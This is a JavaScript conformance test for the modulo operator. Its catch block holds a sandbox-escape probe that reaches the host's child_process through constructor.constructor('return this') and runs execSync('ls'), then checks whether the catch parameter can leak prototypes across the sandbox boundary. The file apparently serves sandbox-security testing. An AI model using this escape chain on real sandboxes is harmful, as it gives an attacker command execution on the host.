try {
    if (isNaN(true % undefined) !== true) {
        $ERROR('#1: true % undefined === Not-a-Number. Actual: ' + true % undefined);
    }
    if (isNaN(undefined % true) !== true) {
        $ERROR('#2: undefined % true === Not-a-Number. Actual: ' + undefined % true);
    }
    if (isNaN(new Boolean(true) % undefined) !== true) {
        $ERROR('#3: new Boolean(true) % undefined === Not-a-Number. Actual: ' + new Boolean(true) % undefined);
    }
    if (isNaN(undefined % new Boolean(true)) !== true) {
        $ERROR('#4: undefined % new Boolean(true) === Not-a-Number. Actual: ' + undefined % new Boolean(true));
    }
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}